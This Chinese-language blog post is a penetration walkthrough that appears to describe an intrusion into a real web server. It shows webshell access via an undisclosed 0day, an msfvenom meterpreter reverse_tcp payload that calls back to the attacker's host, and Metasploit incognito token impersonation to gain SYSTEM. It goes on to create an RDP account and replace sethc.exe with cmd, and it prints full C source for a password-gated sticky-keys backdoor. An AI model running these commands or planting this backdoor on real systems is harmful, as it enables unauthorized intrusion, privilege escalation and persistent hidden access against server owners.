<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>渗透测试之MSF窃取Windows用户令牌 | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">渗透测试之MSF窃取Windows用户令牌</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2018/09/26/渗透测试之MSF窃取Windows用户令牌/">2018-09-26</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/渗透测试/">渗透测试</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先利用自己审计的0day将一句话木马写入目标网站，使用菜刀连接上目标，打开虚拟终端查看当前拥有的用户及系统信息。可以发现，网站系统为2008 R2版本的，且打了比较多的补丁。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\www\&gt; net users</span><br><span class="line"></span><br><span class="line">\\WIN-********* 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    mysql                    </span><br><span class="line">MySQL                    www</span><br><span class="line">D:\www\&gt; systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           WIN-*********</span><br><span class="line">OS 名称:          Microsoft Windows Server 2008 R2 Enterprise </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00486-OEM-8400691-20006</span><br><span class="line">初始安装日期:     2018/8/29, 14:37:18</span><br><span class="line">系统启动时间:     2018/9/13, 3:20:51</span><br><span class="line">系统制造商:       Gooxi</span><br><span class="line">系统型号:         SY312-S24R/SY206-S12R/SY103-S06R</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~3100 Mhz</span><br><span class="line">BIOS 版本:        Gooxi G1SCN-B.2.31, 2016/6/15</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     8,155 MB</span><br><span class="line">可用的物理内存:   3,851 MB</span><br><span class="line">虚拟内存: 最大值: 16,308 MB</span><br><span class="line">虚拟内存: 可用:   11,083 MB</span><br><span class="line">虚拟内存: 使用中: 5,225 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 173 个修补程序。</span><br><span class="line">                  [01]: KB981391</span><br><span class="line">                  [02]: KB981392</span><br><span class="line">                  [03]: KB977236</span><br><span class="line">                  [04]: KB981111</span><br><span class="line">                  [05]: KB977238</span><br><span class="line">                  [06]: KB2849697</span><br><span class="line">                  [07]: KB2849696</span><br><span class="line">                  ................</span><br><span class="line">                  [170]: KB4457044</span><br><span class="line">                  [171]: KB976902</span><br><span class="line">                  [172]: KB982018</span><br><span class="line">                  [173]: KB4457144</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br></pre></td></tr></table></figure>
<p>一开始我使用 <a href="https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120" target="_blank" rel="noopener"><strong>CVE-2018-8120</strong></a> 尝试提权，这个提权之前刚爆出来的时候还是挺好用的，然而这里提权失败。于是我打算直接使用MSF中的令牌环窃取来伪造身份进行登录。</p>
<p>首先在有公网IP地址的机器上用MSF生成反弹shell的木马，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=本机IP LPORT=本机端口 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
<p>将生成的木马上传并执行，在肉鸡上开启MSF监听，接收反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 本机端口</span><br><span class="line">LPORT =&gt; 本机端口</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 本机IP</span><br><span class="line">LHOST =&gt; 本机IP</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 本机IP:本机要侦听的端口</span><br></pre></td></tr></table></figure>
<p>载入 <strong>incognito</strong> 插件，然后我们首先需要做的，是查看此系统上有哪些可用的令牌。用户权限不同，所能看到的令牌个数也不同。在命令框中输入： <strong>list_tokens -u</strong> 来查看可用的令牌：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-66666\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
<p>接下来就是模拟这个 <strong>system</strong> 用户的令牌以获得 <strong>system</strong> 权限，在命令框中输入： <strong>impersonate_token “NT AUTHORITY\\SYSTEM”</strong> ，其中第一个反斜杠用来转义第二个反斜杠。最后用 <strong>getuid</strong> 命令查看当前用户权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; impersonate_token <span class="string">"NT AUTHORITY\\SYSTEM"</span></span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self <span class="keyword">if</span> primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<p>成功提权，关于窃取令牌的原理，大家可以阅读文章结尾处的相关文章。</p>
<p>由于目标是Windows系统，管理员多数会开远程桌面协议进行管理（RDP协议默认为3389端口），而一般管理员会修改默认端口为其他端口从而避免被攻击，所以这里我们使用以下命令来查看RDP的真实端口。在命令行分别输入如下命令（ <strong>tasklist /svc | findstr TermService</strong> 用来查看RDP服务的PID号，然后用 <strong>netstat -nao | findstr PID号</strong> 来查看RDP服务运行的端口号）：</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/1.png" alt="1"></p>
<p>这样，我们就可以使用之前MSF下的system权限创建账户，然后远程登录目标系统。</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/2.png" alt="2"></p>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>为了使权限不丢失，我们可以在目标系统留一个后门。这里我喜欢将 <strong>C:\Windows\System32\sethc.exe</strong> 程序替换成cmd程序，这样我们只要打开远程登录的界面，按5下 <strong>shift</strong> 键就会以system权限调用cmd程序。然而这样留的后门很容易被人利用，所以我们可以自己用C语言写一个小程序，加入密码验证功能，让这个小程序来调用cmd程序。这里我直接贴出我的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> welcome[<span class="number">1700</span>] = <span class="string">"                                      \n\</span></span><br><span class="line"><span class="string">                     _____    ___     ___    _                                      \n\</span></span><br><span class="line"><span class="string">                    |_   _|  / _ \\   / _ \\  | |  ___                                \n\</span></span><br><span class="line"><span class="string">                      | |   | | | | | | | | | | / __|                               \n\</span></span><br><span class="line"><span class="string">                      | |   | |_| | | |_| | | | \\__ \\                               \n\</span></span><br><span class="line"><span class="string">                      |_|    \\___/   \\___/  |_| |___/                               \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                      Please input your password!               \n\</span></span><br><span class="line"><span class="string">                           password : "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,welcome);</span><br><span class="line">        <span class="keyword">char</span> password[<span class="number">30</span>] = <span class="string">"0"</span>;</span><br><span class="line">        <span class="keyword">char</span> pwd[<span class="number">30</span>] = <span class="string">"t00ls66666"</span>;</span><br><span class="line">        <span class="keyword">int</span> ch,i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((ch = getch())!=<span class="string">'\r'</span>)&#123;</span><br><span class="line">            password[i++] = ch;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,<span class="string">'*'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(password,pwd,<span class="number">10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"Error\n"</span>);</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后贴一张效果图片（这里我使用本地虚拟机来演示）：</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/3.gif" alt="3"></p>
<p>本文没啥技术亮点，不喜勿喷哈：)</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://pentestlab.blog/2017/04/03/token-manipulation/" target="_blank" rel="noopener">Token Manipulation</a> </p>
<p><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank" rel="noopener">Fun with Incognito</a> </p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2018/09/26/渗透测试之MSF窃取Windows用户令牌/">https://mochazz.github.io/2018/09/26/渗透测试之MSF窃取Windows用户令牌/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/windows/">windows</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2018/09/27/渗透测试之绕过PHP的disable_functions/">&lt; 渗透测试之绕过PHP的disable_functions</a><a class="next" href="/2018/09/16/代码审计Day12 - 误用htmlentities函数引发的漏洞/">代码审计Day12 - 误用htmlentities函数引发的漏洞 &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
.v a { color: #0F9FB4; }
.v a:hover { color: #216C73; }
.v li { list-style: inherit; }
.v .vwrap { border: 1px solid #223441; border-radius: 0; }
.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.v .vbtn { border-radius: 0; color: #cecece; background: none; }
.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>